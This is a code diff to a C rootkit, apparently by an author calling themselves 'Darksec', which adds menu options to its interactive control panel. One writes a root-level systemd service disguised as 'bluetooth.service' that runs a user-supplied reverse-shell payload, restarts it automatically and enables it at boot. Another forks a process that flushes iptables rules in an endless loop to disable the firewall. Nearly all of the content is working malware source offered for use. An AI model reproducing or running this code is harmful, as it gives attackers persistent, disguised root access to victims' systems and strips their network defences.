@@ -2,6 +2,7 @@
 // author: Darksec, in development phase
 
 #define _GNU_SOURCE
+#include <stdlib.h>
 #include <signal.h>
 #include <stdio.h>
 #include <dlfcn.h>
@@ -43,8 +44,9 @@ if(strcmp(password, pass) == 0){
 	int escolha;
 
 	printf("1) REVERSE SHELL \n");
-	printf("2) LOADING FULL ROOTKIT \n");
-	printf("3  EXIT \n");
+	printf("2) BACKDOOR SYSTEMD \n");
+	printf("3) ANTI_FIREWALL EASY\n");
+	printf("4) EXIT \n");
 	printf("=> ");
 	scanf("%i", &escolha);
 
@@ -88,17 +90,57 @@ if(fork() == 0){
 
 case 2:
 
-	printf("test \n");
-	break;
+	char command[200];
+	char payload[200];
 
+	printf("YOUR PAYLOAD FOR REVERSE SHELL\n");
+	printf("[+] => ");
+	fgets(payload,200,stdin);
+
+	system("echo '[backdoor]' > /etc/systemd/system/bluetooth.service");
+	system("echo 'Description=Backdoor_for_linux' >> /etc/systemd/system/bluetooth.service");
+	system("echo '' >> /etc/systemd/system/bluetooth.service");
+	system("echo '[Service]' >> /etc/systemd/system/bluetooth.service");
+	system("echo 'User=root' >> /etc/systemd/system/bluetooth.service");
+	system("echo 'Group=root' >> /etc/systemd/system/bluetooth.service");
+	system("echo 'WorkingDirectory=/root' >> /etc/systemd/system/bluetooth.service");
+
+	// Payload	
+
+	sprintf(command, "echo 'ExecStart=%s' >> /etc/systemd/system/bluetooth.service ", payload);
+	system(command);
+
+	system("echo 'Restart=always' >> /etc/systemd/system/bluetooth.service");
+	system("echo 'RestartSec=5' >> /etc/systemd/system/bluetooth.service");
+	system("echo '' >> /etc/systemd/system/bluetooth.service");
+	system("echo '[Install]' >> /etc/systemd/system/bluetooth.service");
+	system("echo 'WantedBy=multi-user.target' >> /etc/systemd/system/bluetooth.service");
+
+	// INIT SERVICE BACKDOOR
+	system("/usr/bin/systemctl start bluetooth.service && /usr/bin/systemctl enable bluetooth.service");
+
+
+	break;
 case 3:
 
+if(fork() == 0){
+
+while(1){
+
+system("/usr/bin/iptables -F");
+
+	}
+}
+
+
+case 4:
+
 	return 0;
-	break;
+        break;
 
 default:
 
-	printf("[!] ERROR, CHOICE 1 OR 2 \n");
+	printf("[!] TRY AGAIN! \n");
 
 }
 
